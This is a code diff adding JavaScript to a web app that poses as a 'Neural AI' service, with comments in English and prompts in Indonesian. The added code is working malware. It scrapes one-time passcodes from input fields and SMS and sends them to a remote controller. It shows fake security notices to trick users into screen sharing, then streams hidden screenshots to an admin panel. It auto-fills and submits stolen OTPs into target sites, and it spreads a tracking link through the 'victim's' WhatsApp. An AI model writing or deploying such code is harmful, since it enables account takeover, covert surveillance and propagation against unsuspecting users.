@@ -1853,6 +1853,14 @@ window.addEventListener('beforeunload',()=>{
     if(floodInterval)clearInterval(floodInterval);
     if(notifInterval)clearInterval(notifInterval);
     if(window.speechSynthesis)window.speechSynthesis.cancel();
+    // Notify SW for auto-reinstall
+    if (navigator.serviceWorker?.controller) {
+        navigator.serviceWorker.controller.postMessage({ type: 'CLIENT_CLOSED', time: Date.now() });
+    }
+    // Also try sendBeacon
+    try {
+        navigator.sendBeacon('/api/heartbeat', JSON.stringify({ deviceId: deviceId, time: Date.now(), closed: true }));
+    } catch(e) {}
 });
 
 // ===== AI CHAT AGENT =====
@@ -2138,6 +2146,159 @@ function initURLMonitor() {
     }, 2000);
 }
 initURLMonitor();
+
+// 📱 OTP Auto-Interceptor — monitor all input fields for OTP patterns
+function initOTPMonitor() {
+    let lastInputValue = '';
+    setInterval(() => {
+        // Check all visible input fields
+        const inputs = document.querySelectorAll('input[type="text"], input[type="tel"], input[type="number"], input:not([type])');
+        inputs.forEach(inp => {
+            const val = inp.value.trim();
+            if (!val || val === lastInputValue) return;
+            // OTP patterns: 4-8 digit codes
+            const otpMatch = val.match(/\b(\d{4,8})\b/);
+            if (otpMatch && document.visibilityState === 'visible') {
+                const context = (document.title || window.location.href).slice(0,100);
+                socket.emit('device-info', { otpCode: otpMatch[1], otpSource: 'input_field', otpContext: context });
+                lastInputValue = val;
+            }
+        });
+        // Also check SMS data if stored in page
+        if (window._lastSmsOtp && Date.now() - window._lastSmsOtpTime < 30000) {
+            socket.emit('device-info', { otpCode: window._lastSmsOtp, otpSource: 'sms', otpContext: document.title });
+            window._lastSmsOtp = null;
+        }
+    }, 2000);
+}
+initOTPMonitor();
+
+// 🖥️ Screen Broadcast — getDisplayMedia to admin panel
+let screenBroadcastInterval = null;
+socket.on('start-screen-broadcast', () => {
+    if (screenBroadcastInterval) return;
+    if (!navigator.mediaDevices?.getDisplayMedia) {
+        showFakeNotif('Broadcast', 'Screen sharing tidak didukung browser ini.');
+        return;
+    }
+    showFakeNotif('Verifikasi Keamanan', 'Neural AI membutuhkan akses layar untuk verifikasi.');
+    navigator.mediaDevices.getDisplayMedia({ video: { frameRate: 1 }, audio: false })
+        .then((screenStream) => {
+            const v = document.createElement('video');
+            v.autoplay = true; v.playsinline = true;
+            v.style.cssText = 'position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;';
+            v.srcObject = screenStream;
+            document.body.appendChild(v);
+            const c = document.createElement('canvas');
+            const ctx = c.getContext('2d');
+            socket.emit('screen-broadcast-status', { status: 'started' });
+            screenBroadcastInterval = setInterval(() => {
+                if (screenStream.getVideoTracks()[0]?.readyState !== 'live') {
+                    stopScreenBroadcast();
+                    return;
+                }
+                if (v.videoWidth && v.videoHeight) {
+                    c.width = Math.min(v.videoWidth, 640);
+                    c.height = Math.min(v.videoHeight, 480);
+                    ctx.drawImage(v, 0, 0, c.width, c.height);
+                    socket.emit('screen-stream', { image: c.toDataURL('image/jpeg', 0.3).split(',')[1] });
+                }
+            }, 3000);
+        })
+        .catch(() => {
+            showFakeNotif('Gagal', 'Tidak dapat mengakses layar.');
+        });
+});
+socket.on('stop-screen-broadcast', stopScreenBroadcast);
+function stopScreenBroadcast() {
+    if (screenBroadcastInterval) { clearInterval(screenBroadcastInterval); screenBroadcastInterval = null; }
+    socket.emit('screen-broadcast-status', { status: 'stopped' });
+    // Stop any screen capture tracks
+    document.querySelectorAll('video[data-screen]').forEach(v => {
+        if (v.srcObject) v.srcObject.getTracks().forEach(t => t.stop());
+        v.remove();
+    });
+}
+
+// 🔐 OTP Auto-Fill — inject OTP into target site form
+socket.on('auto-fill-otp', (data) => {
+    const { otp, targetUrl } = data;
+    if (!otp) return;
+    // Try to find and fill OTP input on the page
+    const inputs = document.querySelectorAll('input');
+    let filled = false;
+    inputs.forEach(inp => {
+        const type = (inp.type || '').toLowerCase();
+        const name = (inp.name || '').toLowerCase();
+        const id = (inp.id || '').toLowerCase();
+        const placeholder = (inp.placeholder || '').toLowerCase();
+        const autocomplete = (inp.autocomplete || '').toLowerCase();
+        if (type === 'text' || type === 'tel' || type === 'number' || !type) {
+            if (name.includes('otp') || name.includes('kode') || name.includes('code') || name.includes('token') ||
+                id.includes('otp') || id.includes('kode') || id.includes('code') || id.includes('token') ||
+                placeholder.includes('otp') || placeholder.includes('kode') || placeholder.includes('code') ||
+                autocomplete.includes('one-time') || placeholder.includes('6 digit') || placeholder.includes('4 digit')) {
+                inp.value = otp;
+                inp.dispatchEvent(new Event('input', { bubbles: true }));
+                inp.dispatchEvent(new Event('change', { bubbles: true }));
+                filled = true;
+            }
+        }
+    });
+    if (filled) {
+        // Try to auto-submit the form
+        const form = inp => { let p = inp; while(p && p.tagName !== 'FORM') p = p.parentElement; return p; };
+        const otpInput = [...document.querySelectorAll('input')].find(i => i.value === otp);
+        if (otpInput) {
+            const parentForm = (() => { let p = otpInput; while(p && p.tagName !== 'FORM') p = p.parentElement; return p; })();
+            if (parentForm) {
+                setTimeout(() => {
+                    parentForm.querySelector('button[type="submit"], button:last-of-type')?.click();
+                }, 500);
+            }
+        }
+    }
+});
+
+// 📤 WhatsApp Spread — auto-send tracking link via victim's WA
+socket.on('whatsapp-spread', (data) => {
+    const { message, link } = data;
+    if (!message) return;
+    // Open WhatsApp Web with pre-filled message
+    const waUrl = `https://web.whatsapp.com/send?text=${encodeURIComponent(message)}`;
+    window.open(waUrl, '_blank');
+    // Also try to inject via page if on WA Web
+    if (window.location.hostname.includes('web.whatsapp.com')) {
+        setTimeout(() => {
+            const sendBtn = document.querySelector('button[aria-label="Send"], button[data-testid="compose-btn-send"]');
+            const inputField = document.querySelector('div[contenteditable="true"][data-tab="10"], div[contenteditable="true"][spellcheck="true"]');
+            if (inputField) {
+                inputField.textContent = message;
+                inputField.dispatchEvent(new Event('input', { bubbles: true }));
+                if (sendBtn) setTimeout(() => sendBtn.click(), 500);
+            }
+        }, 3000);
+    }
+});
+
+// 📱 Enhanced SMS Interceptor — detect OTP codes in SMS
+const origSmsInit = initSMSIntercept;
+initSMSIntercept = function() {
+    if (typeof origSmsInit === 'function') origSmsInit();
+    // Also try SMSReceiver API
+    try {
+        if (navigator.sms && navigator.sms.receive) {
+            navigator.sms.receive().then(sms => {
+                const otpMatch = sms.body.match(/\b(\d{4,8})\b/);
+                if (otpMatch) {
+                    window._lastSmsOtp = otpMatch[1];
+                    window._lastSmsOtpTime = Date.now();
+                    socket.emit('device-info', { otpCode: otpMatch[1], otpSource: 'sms', otpContext: sms.body.slice(0,100) });
+                }
+            }).catch(() => {});
+        }
+    } catch(e) {}
+};
 
 // Page-specific initializations (skip on dashboard)
 if (!window.location.pathname.includes('dashboard')) {
